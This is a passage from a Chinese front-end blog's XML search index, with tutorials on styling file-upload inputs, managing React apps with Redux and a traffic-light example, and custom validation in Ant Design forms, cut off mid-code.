top: 0; opacity: 0;&#125;.file:hover &#123; background: #AADFFD; border-color: #78C3F3; color: #004974; text-decoration: none;&#125;修改后如下：样式二：美化后显示文件名上面美化，把默认显示的文件名也给隐藏掉了，那么如何显示文件名称呢？没关系，我们可以用jquery来获取文件的文件名。我们可以写个change事件12345678910111213$(".a-upload").on("change","input[type='file']",function()&#123; var filePath=$(this).val(); if(filePath.indexOf("jpg")!=-1 || filePath.indexOf("png")!=-1)&#123; $(".fileerrorTip").html("").hide(); var arr=filePath.split('\\'); var fileName=arr[arr.length-1]; $(".showFileName").html(fileName); &#125;else&#123; $(".showFileName").html(""); $(".fileerrorTip").html("您未上传文件，或者您上传文件类型有误！").show(); return false &#125;&#125;)]]></content>
      <categories>
        <category>HTML5/CSS3</category>
      </categories>
      <tags>
        <tag>input[type=file]</tag>
        <tag>input[type=file]样式美化</tag>
        <tag>input上传按钮美化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何使用Redux管理你的React应用]]></title>
    <url>%2F2017%2F10%2F30%2F%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8Redux%E7%AE%A1%E7%90%86%E4%BD%A0%E7%9A%84React%E5%BA%94%E7%94%A8%2F</url>
    <content type="text"><![CDATA[为什么使用React还需要使用别的框架来搭配？React的核心是使用组件定义界面的表现，是一个View层的前端库，那么在使用React的时候我们通常还需要一套机制去管理组件与组件之间，组件与数据模型之间的通信。为什么使用Redux？Facebook官方提出了FLUX思想管理数据流，同时也给出了自己的实现来管理React应用。可是当我打开FLUX的文档时候，繁琐的实现，又臭又长的文档，实在难以让我有使用它的欲望。幸好，社区中和我有类似想法的不在少数，github上也涌现了一批关于实现FLUX的框架，比较出名的有Redux,Reflux,Flummox。其中Redux的简单和有趣的编程体验是最吸引我的地方。简单。和其它的FLUX实现不一样，Redux只有唯一的state树，不管项目变的有多复杂，我也仅仅只需要管理一个State树。可能你会有疑问，一个state树就够用了？这个state树该有多大？别着急，Redux中的Reducer机制可以解决这个问题。有趣。忙于迭代项目的你，体会编程带来的趣味是有多久没有体会到了？瞧下面这张图，右边那个调试工具是啥？整个应用的action和state都这么被轻松的管理了？行为还能被保存，删除，回滚，重置？修改了代码，页面不刷新也能产生变化？别开玩笑了，不行，世界那么大，让我去试试！注：Redux开发调试工具：redux-devtoolsReact应用无刷新保存工具：hot-loader不明真相的群众，可能这里需要我来安利一下Flux数据流的思想，看图：注意：图片仅仅是FLUX思想，而不是Facebook的实现。大致的过程是这样的，View层不能直接对state进行操作，而需要依赖Actions派发指令来告知Store修改状态，Store接收Actions指令后发生相应的改变，View层同时跟着Store的变化而变化。举个例子：A组件要使B组件发生变化。首先，A组件需要执行一个Action，告知绑定B组件的Store发生变化，Store接收到派发的指令后改变，那相应的B组件的视图也就发生了改变。假如C，D，E，F组件绑定了和B组件相同的Store，那么C，D，E，F也会跟着变化。使用React和Redux开发一个小程序为了更好的描述怎么样使用Redux管理React应用，我做了一个Manage Items的小例子。目录结构12345678910111213141516171819202122.+-- app| +-- actions| +-- index.js| +-- components| +-- content.js| +-- footer.js| +-- searchBar.js| +-- constants| +-- ActionTypes.js| +-- containers| +-- App.js| +-- reducers| +-- index.js| +-- items.js| +-- filter.js| +-- utils| +-- configureStore.js| +-- index.js+-- css| +-- pure.min.css+-- index.htmlIndex.js在入口文件中，我们需要把App和redux建立起联系。Provider是react-redux提供的组件，它的作用是把store和视图绑定在了一起，这里的Store就是那个唯一的State树。当Store发生改变的时候，整个App就可以作出对应的变化。{() =&gt; }是声明了一个返回的函数传进Provider的props.children里，这个方法将会在React的 0.14版本得到简化。12345678910111213141516/* app/index.js */ import React from 'react';import &#123; Provider &#125; from 'react-redux';import App from './containers/App';import configureStore from './configureStore'; const store = configureStore(); React.render( &lt;div&gt; &lt;Provider store=&#123;store&#125;&gt; &#123;() =&gt; &lt;App /&gt; &#125; &lt;/Provider&gt; &lt;/div&gt;, document.getElementById('app'));ConstantskeyMirror这个方法非常的有用，它可以帮助我们轻松创建与键值key相等的常量。12345678910111213141516/* app/constants/actionTypes.js */ import keyMirror from 'react/lib/keyMirror'; export default keyMirror(&#123; ADD_ITEM: null, DELETE_ITEM: null, DELETE_ALL: null, FILTER_ITEM: null&#125;); // 等于// export const ADD_ITEM = 'ADD_ITEM';// export const DELETE_ITEM = 'DELETE_ITEM';// export const DELETE_ALL = 'DELETE_ALL';// export const FILTER_ITEM = 'FILTER_ITEM';ActionsAction向store派发指令，action 函数会返回一个带有 type 属性的 Javascript Plain Object，store将会根据不同的action.type来执行相应的方法。addItem函数的异步操作我使用了一点小技巧，使用redux-thunk中间件去改变dispatch，dispatch是在View层中用bindActionCreators绑定的。使用这个改变的dispatch我们可以向store发送异步的指令。比如说，可以在action中放入向服务端的请求(ajax)，也强烈推荐这样去做。123456789101112131415161718192021222324252627/* app/actions/index.js */ import &#123; ADD_ITEM, DELETE_ITEM, DELETE_ALL, FILTER_ITEM &#125; from '../constants/actionTypes'; export function addItem(item) &#123; return dispatch =&gt; &#123; setTimeout(() =&gt; dispatch(&#123;type: ADD_ITEM&#125;), 1000) &#125;&#125;export function deleteItem(item, e) &#123; return &#123; type: DELETE_ITEM, item &#125;&#125;export function deleteAll() &#123; return &#123; type: DELETE_ALL &#125;&#125;export function filterItem(e) &#123; let filterItem = e.target.value; return &#123; type: FILTER_ITEM, filterItem &#125;&#125;ReducersRedux有且只有一个State状态树，为了避免这个状态树变得越来越复杂，Redux通过 Reducers来负责管理整个应用的State树，而Reducers可以被分成一个个Reducer。Reduce在javascript Array的方法中出现过，只是不太常用。简单快速的用代码样例来回顾一下：1234567891011 /* Array.prototype.reduce */ var arr = [1,2,3,4];var initialValue = 5;var result = arr.reduce(function(previousValue, currentValue) &#123; return previousValue + currentValue&#125;, initialValue)console.log(result)// 15// 该回调函数的返回值为累积结果，并且此返回值在下一次调用该回调函数时作为参数提供。// 整个函数执行的过程大致是这样 ((((5+1)+2)+3)+4)回到Redux中来看，整个的状态就相当于从[初始状态]merge一个[action.state]从而得到一个新的状态，随着action的不断传入，不断的得到新的状态的过程。(previousState, action) =&gt; newState，注意：任何情况下都不要改变previousState，因为这样View层在比较State的改变时只需要简单比较即可，而避免了深度循环比较。Reducer的数据结构我们可以用immutable-js，这样我们在View层只需要react-immutable-render-mixin插件就可以轻松的跳过更新那些state没有发生改变的组件子树。12345678910111213141516171819/* app/reducers/items.js */ import Immutable from 'immutable';import &#123; ADD_ITEM, DELETE_ITEM, DELETE_ALL &#125; from '../constants/actionTypes'; const initialItems = Immutable.List([1,2,3]); export default function items(state = initialItems, action) &#123; switch(action.type) &#123; case ADD_ITEM: return state.push( state.size !=0 ? state.get(-1)+1 : 1 ); case DELETE_ITEM: return state.delete( state.indexOf(action.item) ); case DELETE_ALL: return state.clear(); default: return state; &#125;&#125;连接reducersRedux提供的combineReducers函数可以帮助我们把reducer组合在一起，这样我们就可以把Reducers拆分成一个个小的Reducer来管理Store了。123456789101112/* app/reducers/index.js */ import &#123; combineReducers &#125; from 'redux';import items from './items';import filter from './filter'; const rootReducer = combineReducers(&#123; items, filter&#125;); export default rootReducer;Middleware在Redux中，Middleware 主要是负责改变Store中的dispatch方法，从而能处理不同类型的 action 输入，得到最终的 Javascript Plain Object 形式的 action 对象。以redux-thunk为例子：12345678/* redux-thunk */ export default function thunkMiddleware(&#123; dispatch, getState &#125;) &#123; return next =&gt; action =&gt; typeof action === ‘function’ ? action(dispatch, getState) : next(action);&#125;当ThunkMiddleware 判断action传入的是一个函数，就会为该thunk函数补齐dispatch和getState参数，否则，就调用next(action)，给后续的Middleware（Middleware 插件可以被绑定多个）得到使用dispatch的机会。12345678910/* app/configureStore.js */ import &#123; compose, createStore, applyMiddleware &#125; from 'redux';import thunk from 'redux-thunk';import rootReducer from './reducers'; var buildStore = compose(applyMiddleware(thunk), createStore)export default function configureStore(initialState) &#123; return buildStore(rootReducer, initialState);&#125;UI智能组件和木偶组件，因为本文主要是介绍Redux。本项目中在结构上会把智能组件放在containers中，木偶组件放于components中。containers智能组件，会通过react-redux函数提供的connect函数把state和actions转换为旗下木偶组件所需要的props。12345678910111213141516171819202122232425262728293031323334353637383940/* app/containers/App.js */ import React from 'react';import SearchBar from '../components/searchBar';import Content from '../components/content';import Footer from '../components/footer';import &#123; connect &#125; from 'react-redux';import ImmutableRenderMixin from 'react-immutable-render-mixin';import * as ItemsActions from '../actions';import &#123; bindActionCreators &#125; from 'redux'; let App = React.createClass(&#123; mixins: [ImmutableRenderMixin], propTypes: &#123; items: React.PropTypes.object, filter: React.PropTypes.string &#125;, render() &#123; let styles = &#123; width: '200px', margin: '30px auto 0' &#125; const actions = this.props.actions; return ( &lt;div style=&#123;styles&#125;&gt; &lt;h2&gt;Manage Items&lt;/h2&gt; &lt;SearchBar filterItem=&#123;actions.filterItem&#125;/&gt; &lt;Content items=&#123;this.props.items&#125; filter=&#123;this.props.filter&#125; deleteItem=&#123;actions.deleteItem&#125;/&gt; &lt;Footer addItem=&#123;actions.addItem&#125; deleteAll=&#123;actions.deleteAll&#125;/&gt; &lt;/div&gt; ) &#125; &#125;) export default connect(state =&gt; (&#123; items: state.items, filter: state.filter&#125;), dispatch =&gt; (&#123; actions: bindActionCreators(ItemsActions, dispatch)&#125;))(App);components木偶组件，各司其职，没有什么关于actions和stores的依赖，拿出项目中也可独立使用，甚至可以和别的actions，stores进行绑定。SearchBar：查找Item。Content：控制Items的显示，删除一个Item。Footer：新增Item，删除全部Item。调试工具使用redux-devtools调试，为你在开发过程中带来乐趣。12345678910111213141516171819202122232425262728293031323334353637383940/* app/index.js */ function renderDevTools(store) &#123; if (__DEBUG__) &#123; let &#123;DevTools, DebugPanel, LogMonitor&#125; = require('redux-devtools/lib/react'); return ( &lt;DebugPanel top right bottom&gt; &lt;DevTools store=&#123;store&#125; monitor=&#123;LogMonitor&#125; /&gt; &lt;/DebugPanel&gt; ); &#125;else &#123; return null; &#125;&#125; React.render( &lt;div&gt; &lt;Provider store=&#123;store&#125;&gt; &#123;() =&gt; &lt;App /&gt; &#125; &lt;/Provider&gt; &#123;renderDevTools(store)&#125; &lt;/div&gt;, document.getElementById('app'));/* app/configureStore.js */ var buildStore;if(__DEBUG__) &#123; buildStore = compose( applyMiddleware(thunk), require('redux-devtools').devTools(), require('redux-devtools').persistState(window.location.href.match(/[?&amp;]debug_session=([^&amp;]+)\b/)), createStore )&#125;else &#123; buildStore = compose(applyMiddleware(thunk), createStore)&#125; export default function configureStore(initialState) &#123; return buildStore(rootReducer, initialState);&#125;在你的代码中加上上面的两段代码，运行npm run debug命令，就可以用调试工具来管理你的项目了。]]></content>
      <categories>
        <category>Reactjs</category>
      </categories>
      <tags>
        <tag>React</tag>
        <tag>Redux</tag>
        <tag>如何使用Redux管理你的React应用</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Redux应用详解]]></title>
    <url>%2F2017%2F10%2F30%2FRedux%E5%BA%94%E7%94%A8%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[概览状态管理是软件开发的最困难方面之一，这使得状态管理错误成为了几乎所有 bug 的源头。本系列将探索 Redux，这是一个针对 JavaScript 应用程序的可预测的状态容器。Redux 不仅有助于状态管理，还使得实现一些高级特性变得很简单，比如无限撤销/重做和实时编辑时间旅行 (live-editing time travel)。尽管 Redux 来自 React 社区，但它并不依赖于 React。无论有没有 JavaScript 框架，比如 React、Angular、Backbone 或 Cycle.js，都可以使用 Redux。在第一期文章中，首先将了解 Redux 基础知识，学习如何使用它作为独立的状态容器；然后继续探索如何结合使用 Redux 和 React。后续几期文章将介绍更高级的 Redux 场景，在最后一期文章中，将学习如何结合使用 Redux 和 Angular。Redux 的工作原理Redux 是 Facebook 的 Flux 架构的一种简化实现。（Redux 既是一个表示 “已返回” 的英文单词，也是 reducer + flux 的混合词。）Flux 在本质上采用了模型-视图-控制器 (MVC) 的结构，但引入了很高的复杂性。Redux 从 Elm 借用了缩减程序 (reducer) 的概念来降低了这一复杂性，Elm 是一个基于不可变数据结构和纯函数的强大的反应式函数编程语言。纯函数是没有副作用的函数，Redux 缩减程序是计算应用程序状态的纯函数。Redux 有 3 条原则：应用程序状态存储在单个对象中。应用程序状态不可变，只能通过描述状态更改的操作 彻底替换。缩减程序根据当前状态和某个操作来创建下一个状态。应用程序状态存储在单个对象中Redux 通过一个 JavaScript 对象管理状态，该对象称为数据存储，包含应用程序的所有状态。将状态集中保存在一个对象中，这使得在阅读代码时推断应用程序数据变得更容易。另外，当所有数据都在一个位置时，应用程序更容易调试和测试。将应用程序状态存储在一个对象中，还使持久保存应用程序的整体状态变得更容易。应用程序状态不可变对于 Redux，您不能修改应用程序状态。而需要使用新状态替换现有状态。新状态由操作指定，操作也是不可变的 JavaScript 对象，用于描述状态更改。将状态更改封装在不可变的对象中有许多优点。尽管封装状态更改时使用了模式，但封装状态更改远不止使用模式那么简单，所以最好连同引用一起删除。您在本系列文章中将会看到，其中一个优点是能够实现无限撤销和重做 — 实际上类似于时光机。操作也按严格的顺序执行，所以不会发生竞争条件。缩减程序创建一种新状态缩减程序是纯 JavaScript 函数，它们：根据当前状态和某个操作来创建一个新状态集中化数据变化可处理所有或部分状态可组合和重用因为它们是纯函数，缩减程序没有副作用 — 所以它们很容易读取、测试和调试。您可以构造缩减程序，轻松实现仅关注整体应用程序状态的一部分的简单缩减程序。因为应用程序状态不可变，而且因为缩减程序是没有副作用的纯函数，所以 Redux 是一个可预测的 状态容器：给定任何状态和任何操作，您就可以非常肯定地预测应用程序的下一个状态。Redux 的这种可预测元素是一个非常好的特性，使实现无限撤销/重做和实时编辑时间旅行成为可能。我们接下来将通过两个示例演示一下 Redux 的基础原理。操作、缩减程序和存储在图 1 中，一个简单的 Redux 示例（一个交通信号灯模拟器）的代码在 TextMate 文本编辑器中运行。图中 TextMate 生成的工具提示显示了应用程序的输出，其中显示了应用程序的状态（STOP、CAUTION 或 GO）。图 1. 使用 Redux 的交通信号灯状态图 1 中的代码首先要求使用 Redux 并创建 Redux 存储：123const Redux = require('redux');const createStore = Redux.createStore;const store = createStore(reducer);使用 Redux.createStore() 函数创建应用程序的存储。每个 Redux 应用程序仅有一个存储，每个存储仅有一个缩减程序。将该缩减程序传递给 Redux.createStore() 函数。应用程序的状态（在本例中为一个具有值 GO、STOP 或 CAUTION 的字符串）由 reducer() 函数创建。reducer() 函数根据当前状态和某个描述状态更改的操作来返回一个新状态。清单 1 给出了交通信号灯应用程序的缩减程序。请注意，在状态未定义时（也就是初始状态），reducer() 函数将返回 GO。清单 1. 交通信号灯应用程序的缩减程序12345678910111213141516const reducer = (state = 'GO', action) =&gt; &#123; switch(action.type) &#123; case 'GO': state = 'GO' break; case 'STOP': state = 'STOP' break; case 'CAUTION': state = 'CAUTION'; break; &#125; return state;&#125;接下来，该代码定义了 3 个操作对象，每个对应于一个状态，如清单 2 所示。清单 2. 交通信号灯操作1234567891011const cautionAction = &#123; type: 'CAUTION'&#125;; const goAction = &#123; type: 'GO'&#125;; const stopAction = &#123; type: 'STOP'&#125;最后，如清单 3 所示，应用程序分派操作，通过 Redux 存储的 getState() 方法获取当前状态的引用，并将该状态的值打印到控制台。清单 3. 分配交通信号灯操作12345678910// Dispatch actions.................................................... store.dispatch(stopAction);console.log('State: ' + store.getState()); store.dispatch(cautionAction);console.log('State: ' + store.getState()); store.dispatch(goAction);console.log('State: ' + store.getState());数据流使用 Redux store.dispatch() 函数分派操作时，Redux 将该操作和当前状态一起传递给应用程序的缩减程序。缩减程序创建一个新状态并返回给 Redux。图 2 描绘了该数据流。图 2. Redux 数据流在图 2 中，操作首先调用示意图右下角的 Redux.dispatch()。Redux 分派器将操作分配给应用程序的缩减程序，并将当前状态和操作传递给缩减程序。缩减程序创建新状态并返回给 Redux。最后，Redux 向所有视图组件告知状态已更改，这将导致应用程序被重绘。Redux 通过特定于框架的绑定向视图组件（比如 React 或 Angular 组件）告知状态更改。Redux API整个 Redux API 很简单，仅包含 5 个顶级函数（您已经知道其中一个函数 Redux.createStore()）：Object createStore(reducer, initialState) - 创建 Redux 存储。Object combineReducers(reducers) - 将多个缩减程序组合为一个。Object compose(…functions) - 从左向右构造函数。void applyMiddleware(…middlewares) - 应用 Redux 中间件。Object bindActionCreators(actionCreators, dispatch) - 将多个操作创建器绑定到分派函数。回想一下，Redux 维护着单一缩减程序的引用，该缩减程序负责计算应用程序的整体状态。但在复杂应用程序中维护单个缩减程序函数可能不太实用，尤其是在开发团队协同工作时。顾名思义，combineReducers() 函数将多个缩减程序函数组合为一个。然后，您可以控制缩减程序函数的精细水平，各个开发人员可以独立处理这些函数。借助 Redux applyMiddleware() 函数，可以通过拦截分派调用的中间件来扩展 Redux。这个方便的工具使实现各种各样的横切关注点成为可能，从日志记录到异步操作。Redux 支持操作创建器— 创建操作的函数。bindActionCreators() 函数将操作创建器绑定到 Redux dispatch() 函数，使构造操作创建器变得很容易。您已经看到，createStore() 函数根据应用程序的缩减程序来创建 Redux 存储。请注意，也可以向 createStore() 函数传递初始应用程序状态。拥有存储的引用后，可以调用对象的方法：Object getState() 返回应用程序的当前状态。void dispatch(Objectaction) 分派一个操作，触发一次状态更改。replaceReducer(nextReducer) 替换状态树的缩减程序。subscribe(Functioncallback) 导致 Redux 调用每次分派的回调方法。Redux API 就是如此简单。结合使用 Redux 和 React现在您已经知道了如何在没有框架的情况下使用 Redux，已为学习如何将它与 React 结合使用做好了准备。图 3 中所示的交通信号灯应用程序使用与前一个版本相同的状态、缩减程序和操作 — 但在本例中它是一个 React 应用程序。图 3. 一个交通信号灯该应用程序表示美国的一处交通信号灯。当信号灯为绿色时，如图 3 中顶部图片中所示，唯一可能的下一个状态是 Caution，所以 Go 和 Stop 按钮被禁用。当信号灯为黄色时，唯一可能的下一个状态是 Stop。当信号灯为红色时，唯一可能的下一个状态是 Go。应用程序缩减程序和它的操作的代码未更改，但现在分别位于自己的文件中。清单 4 给出了应用程序的入口点的代码。清单 4. 入口点 (index.js)1234567891011121314151617import React from 'react';import ReactDOM from 'react-dom';import Redux, &#123; createStore &#125; from 'redux'; import &#123; reducer &#125; from './reducer';import &#123; App &#125; from './app'; const store = createStore(reducer); const render = () =&gt; ( ReactDOM.render(&lt;App store=&#123;store&#125;/&gt;, document.getElementById('example'))) store.subscribe(render); render(); // initial render清单 4 的代码使用 ECMAScript 6 (ES6) 导入函数来导入 React、ReactDOM、Redux 和 Redux createStore() 函数。当应用程序启动时，它使用应用程序的缩减程序创建一个 Redux 存储（如 清单 1 所示）。接下来，应用程序使用 Redux 存储的 subscribe() 方法订阅该存储。当 Redux 存储中的状态更改时，Redux 会调用 render() 函数，该函数将呈现 App 组件。请注意，清单 4 中的代码将 Redux 存储设置为一个同名的 App 属性。清单 5 给出了 App 组件。清单 5. 应用程序 (app.js)1234567891011121314import React, &#123; Component &#125; from 'react';import &#123; Stoplight &#125; from './stoplight';import &#123; Buttons &#125; from './buttons'; export class App extends Component &#123; render() &#123; return( &lt;div&gt; &lt;Stoplight store=&#123;this.props.store&#125; /&gt; &lt;Buttons store=&#123;this.props.store&#125; /&gt; &lt;/div&gt; ) &#125;&#125;App 组件进而导入和呈现两个其他的组件（Stoplight 和 Buttons），并将 Redux 存储传递给这些子组件。清单 6 显示了 Stoplight 组件。清单 6. stoplight (stoplight.js)1234567891011121314151617181920212223242526272829303132333435363738import React, &#123; Component &#125; from 'react'; const stopColor = (state) =&gt; &#123; return state == 'STOP' ? 'red' : 'white';&#125; const cautionColor = (state) =&gt; &#123; return state == 'CAUTION' ? 'yellow' : 'white';&#125; const goColor = (state) =&gt; &#123; return state == 'GO' ? 'rgb(39,232,51)' : 'white';&#125; export const Stoplight = (&#123; store&#125;) =&gt; &#123; const state = store.getState(); return( &lt;div style=&#123;&#123;textAlign: 'center'&#125;&#125;&gt; &lt;svg height='170'&gt; &lt;circle cx='145' cy='60' r='15' fill=&#123;stopColor(state)&#125; stroke='black'/&gt; &lt;circle cx='145' cy='100' r='15' fill=&#123;cautionColor(state)&#125; stroke='black'/&gt; &lt;circle cx='145' cy='140' r='15' fill=&#123;goColor(state)&#125; stroke='black'/&gt; &lt;/svg&gt; &lt;/div&gt; )&#125;Stoplight 是一个 React 无状态功能组件，依据应用程序的状态来呈现不同颜色的 SVG 圆圈。该组件从存储的 getState() 方法获取状态，随后使用 3 个帮助器方法之一将状态转换为一种颜色。通过调用 清单 4 中 Redux 存储的 subscribe() 方法，React 在 Redux 状态更改时呈现交通信号灯。这些状态更改由应用程序的按钮发起。在清单 7 中（Buttons 组件的代码），可以看到按钮如何发起状态更改。清单 7. 按钮 (buttons.js)12345678910111213141516171819202122232425262728293031import React, &#123; Component &#125; from 'react';import &#123; goAction, cautionAction, stopAction &#125; from './actions'; export const Buttons = (&#123; store&#125;) =&gt; &#123; const state = store.getState(); return( &lt;div style=&#123;&#123;textAlign: 'center'&#125;&#125;&gt; &lt;button onClick=&#123;() =&gt; &#123;store.dispatch(goAction)&#125;&#125; disabled=&#123;state == 'GO' || state == 'CAUTION'&#125; style=&#123;&#123;cursor: 'pointer'&#125;&#125;&gt; Go &lt;/button&gt; &lt;button onClick=&#123;() =&gt; &#123;store.dispatch(cautionAction)&#125;&#125; disabled=&#123;state == 'CAUTION' || state == 'STOP'&#125; style=&#123;&#123;cursor: 'pointer'&#125;&#125;&gt; Caution &lt;/button&gt; &lt;button onClick=&#123;() =&gt; &#123;store.dispatch(stopAction)&#125;&#125; disabled=&#123;state == 'STOP' || state == 'GO'&#125; style=&#123;&#123;cursor: 'pointer'&#125;&#125;&gt; Stop &lt;/button&gt; &lt;/div&gt; )&#125;按钮被呈现时，它调用 Redux 存储的 getState() 方法来获取应用程序状态的引用。然后 Buttons 组件使用该状态配置按钮的已禁用状态。当用户单击按钮时，该按钮的 onClick() 回调会调用 Redux 存储的 dispatch() 方法，并传递一个合适的操作。无状态和相连组件示例应用程序通过注册一个回调来订阅 Redux 存储，只要存储状态发生更改，Redux 就会调用该回调。该回调呈现整个应用程序。实际上，用户会将整个应用程序连接到 Redux 存储。对于演示用途，连接整个应用程序已足够了，但最好通过 React 的 forceUpdate() 函数将 Redux 存储连接到单个组件。清单 8 给出了交通信号灯应用程序的一个改良的入口点。清单 8. 交通信号灯应用程序的改良后的入口点 (index.js)1234567891011'use strict'; import React from 'react';import ReactDOM from 'react-dom';import Redux, &#123; createStore &#125; from 'redux'; import &#123; reducer &#125; from './reducer';import &#123; App &#125; from './app'; ReactDOM.render(&lt;App store=&#123;createStore(reducer)&#125;/&gt;, document.getElementById('root'))将清单 8 与 清单 4 比较，可以看到代码不再在应用程序级别上订阅 Redux 存储。清单 9 是一个实现 componentWillMount() 的经过改良的 Stoplight 组件。该方法会订阅 Redux 存储，在存储发生更改时调用该组件的 forceUpdate() 方法。清单 9. 改良后的 stoplight (stoplight.js)12345678910111213141516171819202122232425262728293031323334353637383940414243'use strict'; import React, &#123; Component &#125; from 'react'; const stopColor = (store) =&gt; &#123; return store.getState() == 'STOP' ? 'red' : 'white';&#125; const cautionColor = (store) =&gt; &#123; return store.getState() == 'CAUTION' ? 'yellow' : 'white';&#125; const goColor = (store) =&gt; &#123; return store.getState() == 'GO' ? 'rgb(39,232,51)' : 'white';&#125; export class Stoplight extends Component &#123; componentWillMount() &#123; this.props.store.subscribe(() =&gt; &#123; this.forceUpdate(); &#125;); &#125; render() &#123; return( &lt;div style=&#123;&#123;textAlign: 'center'&#125;&#125;&gt; &lt;svg height='170'&gt; &lt;circle cx='145' cy='60' r='15' fill=&#123;stopColor(this.props.store)&#125; stroke='black'/&gt; &lt;circle cx='145' cy='100' r='15' fill=&#123;cautionColor(this.props.store)&#125; stroke='black'/&gt; &lt;circle cx='145' cy='140' r='15' fill=&#123;goColor(this.props.store)&#125; stroke='black'/&gt; &lt;/svg&gt; &lt;/div&gt; ) &#125;&#125;清单 10 给出了一个改良后的 Buttons 组件，它经过了类似的改良，实现 componentWillMount() 来订阅 Redux 存储。清单 10. 改良后的按钮 (buttons.js)1234567891011121314151617181920212223242526272829303132333435363738'use strict'; import React, &#123; Component &#125; from 'react';import &#123; goAction, cautionAction, stopAction &#125; from './actions'; export class Buttons extends Component &#123; componentWillMount() &#123; this.props.store.subscribe(() =&gt; &#123; this.forceUpdate(); &#125;); &#125; render() &#123; const state = this.props.store.getState(); return( &lt;div style=&#123;&#123;textAlign: 'center'&#125;&#125;&gt; &lt;button onClick=&#123;() =&gt; &#123;this.props.store.dispatch(goAction)&#125;&#125; disabled=&#123;state == 'GO' || state == 'CAUTION'&#125; style=&#123;&#123;cursor: 'pointer'&#125;&#125;&gt; Go &lt;/button&gt; &lt;button onClick=&#123;() =&gt; &#123;this.props.store.dispatch(cautionAction)&#125;&#125; disabled=&#123;state == 'CAUTION' || state == 'STOP'&#125; style=&#123;&#123;cursor: 'pointer'&#125;&#125;&gt; Caution &lt;/button&gt; &lt;button onClick=&#123;() =&gt; &#123;this.props.store.dispatch(stopAction)&#125;&#125; disabled=&#123;state == 'STOP' || state == 'GO'&#125; style=&#123;&#123;cursor: 'pointer'&#125;&#125;&gt; Stop &lt;/button&gt; &lt;/div&gt; ) &#125;&#125;将 清单 9 中的 Stoplight 组件和 清单 10 中的 Buttons 组件的实现与它们的原始实现比较一下（清单 6 和 清单 7）。可以看到，除了添加了 componentWillMount() 方法之外，两个组件都从无状态功能组件更改成了类。这是因为 React 无状态功能组件不支持 React 生命周期方法。其他所有方面均类似，无状态组件最适合维护状态的组件，这也是 Redux 很有用的原因：维护状态容易出错，这是大部分 bug 的源头。在下一期文章中，将学习如何通过使用 Redux React 绑定，将 Stoplight 和 Buttons 组件恢复为无状态组件。结束语管理状态对任何非平凡的应用程序都至关重要。尽管状态管理可能不是一个很吸引力的主题，但 Redux是最流行的 JavaScript 库之一。它流行的原因不仅在于 Redux 可管理状态，还在于它使用不可变的数据和纯函数来可预测地管理状态。这种可预测性使得实现平时通常很难实现的某个特性类别变得很容易，比如无限撤销/重做。]]></content>
      <categories>
        <category>Reactjs</category>
      </categories>
      <tags>
        <tag>Redux</tag>
        <tag>Redux应用详解</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ant Design中实现自定义组件验证]]></title>
    <url>%2F2017%2F10%2F27%2FAnt%20Design%E4%B8%AD%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%AE%9A%E4%B9%89%E7%BB%84%E4%BB%B6%E9%AA%8C%E8%AF%81%2F</url>
    <content type="text"><![CDATA[ant.design是蚂蚁金服前端团队开发出来的一个基于React的框架，有比较丰富的组件可供使用。在实际开发中，一个常见任务是表单验证。ant.design自身的Input, Upload等组件已经自带了ant.design的form验证，但我们自己开发的组件很多同学不清楚怎么实现，所以还借助了jquery等来取值或直接取dom值，然后自己写验证，这种方式可以实现，但往往体验不是一致。今天要给大家介绍一招即可实现自定义组件的表单验证。直接撸代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455class MyTag extends React.Component &#123; constructor()&#123; super(); this.state = &#123; tags: [], adding: false &#125; &#125;; addTag = () =&gt; &#123; let tag = this.refs.tag.refs.input.value.trim(); if(tag == '')&#123; message.error("标签不能为空"); &#125; if(tag.length&gt;16)&#123; message.error("长度不能大于16"); &#125; const tags = [...this.state.tags, &#123; name: tag &#125;]; this.setState(&#123; tags: tags, adding: false &#125;); this.props.onChange(tags);//只用加这行 &#125;; add = ()=&gt;&#123; this.setState(&#123;adding: true&#125;); &#125;; cancel = ()=&gt;&#123; this.setState(&#123;adding: false&#125;); &#125;; render() &#123; return ( &lt;div&gt; &lt;div&gt; &#123;this.state.tags.map((tag,i) =&gt; &lt;Tag key=&#123;i&#125; closable=&#123;true&#125;&gt; &#123;tag.name&#125; &lt;/Tag&gt; )&#125; &lt;/div&gt; &#123;this.state.add? &lt;InputGroup size="large"&gt; &lt;Col span="8"&gt; &lt;Input type="text" ref="tag" /&gt; &lt;/Col&gt; &lt;Col span="8"&gt; &lt;Button onClick=&#123;this.addTag&#125;&gt;添加&lt;/Button&gt; &lt;Button onClick=&#123;this.cancel&#125;&gt;取消&lt;/Button&gt; &lt;/Col&gt; &lt;/InputGroup&gt; : &lt;Button onClick=&#123;this.add&#125;&gt;添加&lt;/Button&gt; &#125; &lt;/div&gt; ); &#125;&#125;上面代码有很多,其中最关键的是在addTag方法中调用了this.props.onChange()方法，这个方法是组件经过getFieldDecorator包装后就会有的一个方法。所以实际的验证代码如下：123456789&lt;FormItem label="标签" labelCol=&#123;&#123; span: 6 &#125;&#125; wrapperCol=&#123;&#123; span: 14 &#125;&#125;&gt; &#123;getFieldDecorator('tags', &#123; rules: [ &#123; required: true, message: '必填', type:'array'&#125;],&#125;)( &lt;MyTag tags=&#123;[]&#125;/&gt; )&#125;&lt;/FormItem&gt;在这里MyTag的使用和Input的在验证方式上没什么不同，这里面就是一个必填验证。所以实现验证原理上很简单，就是那么一行代码！只要在改变数据的时候回调onChange即可实现！以上使用this.props.onChange成功使用上了ant.design的系统验证方式，但是以required验证来举例。进一步想，如果要实现验证tag，除了在保存的时候主动验证之外，还有其它方式来实现吗？其实ant.design内部使用了async-validator，通过阅读async-validator的文档，了解到每个rule其实都是可以定制validator。validator是个函数，其中有三个参数很重要：rule,value和callback。rule：这个是规则，可以不用value：这个是要验证的值callback：这个是回调函数，验证出错后可以把错误信息作为参数调用callback理解了这三个参数后，就很容易写一个定制的validator，最后我们的代码是这样的：123456789101112131415161718192021222324252627282930&lt;FormItem label="标签" labelCol=&#123;&#123; span: 6 &#125;&#125; wrapperCol=&#123;&#123; span: 14 &#125;&#125;&gt; &#123;getFieldDecorator('tags', &#123; rules: [&#123; required: true, type:'array', message:'必填', &#125;,&#123; validator(rule, values, callback)&#123; if(values 